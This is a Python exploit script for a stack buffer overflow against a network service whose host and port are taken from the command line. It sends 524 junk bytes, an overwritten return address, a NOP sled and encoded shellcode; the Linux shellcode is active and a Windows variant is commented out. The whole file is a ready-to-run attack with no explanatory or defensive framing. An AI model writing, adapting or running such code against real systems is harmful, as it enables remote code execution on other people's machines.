import socket
import sys
import time

HOST = sys.argv[1]
PORT = int(sys.argv[2])
TRGT = (HOST,PORT)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

junk = b"\x41" * 524

nopSled = b"\x90" * 10

eip = b"\xf3\x12\x17\x31"

################# SHELLCODE FOR WINDOWS ########################
# buf =  b""
# buf += b"\xdb\xc1\xd9\x74\x24\xf4\xba\xf5\xba\x15\x5e\x5d\x33"
# buf += b"\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\xa0\xa9\xf7"
# buf += b"\xab\xb6\x26\x75\x53\x46\xb7\x1a\xdd\xa3\x86\x1a\xb9"
# buf += b"\xa0\xb9\xaa\xc9\xe4\x35\x40\x9f\x1c\xcd\x24\x08\x13"
# buf += b"\x66\x82\x6e\x1a\x77\xbf\x53\x3d\xfb\xc2\x87\x9d\xc2"
# buf += b"\x0c\xda\xdc\x03\x70\x17\x8c\xdc\xfe\x8a\x20\x68\x4a"
# buf += b"\x17\xcb\x22\x5a\x1f\x28\xf2\x5d\x0e\xff\x88\x07\x90"
# buf += b"\xfe\x5d\x3c\x99\x18\x81\x79\x53\x93\x71\xf5\x62\x75"
# buf += b"\x48\xf6\xc9\xb8\x64\x05\x13\xfd\x43\xf6\x66\xf7\xb7"
# buf += b"\x8b\x70\xcc\xca\x57\xf4\xd6\x6d\x13\xae\x32\x8f\xf0"
# buf += b"\x29\xb1\x83\xbd\x3e\x9d\x87\x40\x92\x96\xbc\xc9\x15"
# buf += b"\x78\x35\x89\x31\x5c\x1d\x49\x5b\xc5\xfb\x3c\x64\x15"
# buf += b"\xa4\xe1\xc0\x5e\x49\xf5\x78\x3d\x06\x3a\xb1\xbd\xd6"
# buf += b"\x54\xc2\xce\xe4\xfb\x78\x58\x45\x73\xa7\x9f\xaa\xae"
# buf += b"\x1f\x0f\x55\x51\x60\x06\x92\x05\x30\x30\x33\x26\xdb"
# buf += b"\xc0\xbc\xf3\x4c\x90\x12\xac\x2c\x40\xd3\x1c\xc5\x8a"
# buf += b"\xdc\x43\xf5\xb5\x36\xec\x9c\x4c\xd1\xd3\xc9\x4f\x49"
# buf += b"\xbc\x0b\x4f\x96\xa8\x85\xa9\xc2\xc0\xc3\x62\x7b\x78"
# buf += b"\x4e\xf8\x1a\x85\x44\x85\x1d\x0d\x6b\x7a\xd3\xe6\x06"
# buf += b"\x68\x84\x06\x5d\xd2\x03\x18\x4b\x7a\xcf\x8b\x10\x7a"
# buf += b"\x86\xb7\x8e\x2d\xcf\x06\xc7\xbb\xfd\x31\x71\xd9\xff"
# buf += b"\xa4\xba\x59\x24\x15\x44\x60\xa9\x21\x62\x72\x77\xa9"
# buf += b"\x2e\x26\x27\xfc\xf8\x90\x81\x56\x4b\x4a\x58\x04\x05"
# buf += b"\x1a\x1d\x66\x96\x5c\x22\xa3\x60\x80\x93\x1a\x35\xbf"
# buf += b"\x1c\xcb\xb1\xb8\x40\x6b\x3d\x13\xc1\x9b\x74\x39\x60"
# buf += b"\x34\xd1\xa8\x30\x59\xe2\x07\x76\x64\x61\xad\x07\x93"
# buf += b"\x79\xc4\x02\xdf\x3d\x35\x7f\x70\xa8\x39\x2c\x71\xf9"

################# SHELLCODE FOR LINUX ########################
buf =  b""
buf += b"\xda\xdb\xb8\x1a\x93\xc9\xe5\xd9\x74\x24\xf4\x5a\x33"
buf += b"\xc9\xb1\x12\x83\xc2\x04\x31\x42\x13\x03\x58\x80\x2b"
buf += b"\x10\x6d\x7d\x5c\x38\xde\xc2\xf0\xd5\xe2\x4d\x17\x99"
buf += b"\x84\x80\x58\x49\x11\xab\x66\xa3\x21\x82\xe1\xc2\x49"
buf += b"\xd5\xba\x34\xe1\xbd\xb8\x36\xee\xa9\x34\xd7\xa0\xb4"
buf += b"\x16\x49\x93\x8b\x94\xe0\xf2\x21\x1a\xa0\x9c\xd7\x34"
buf += b"\x36\x34\x40\x64\x97\xa6\xf9\xf3\x04\x74\xa9\x8a\x2a"
buf += b"\xc8\x46\x40\x2c"

shellcode = buf

payload = junk + eip + nopSled + shellcode

def con():
	try:
		pass
		s.connect(TRGT)
		print("[+] Connected.\n")
	except Exception as e:
		print("[-] Service not available.\n")


def exploit():
	
	print("[*] Connecting to agent...")
	con()
	
	try:		
		print("[*] Sending payload...")
		s.send(payload)
		print("[+] Done!")
			
	except Exception as e:
		print("[-] Problem while sending the payload.\n"+str(e))

exploit()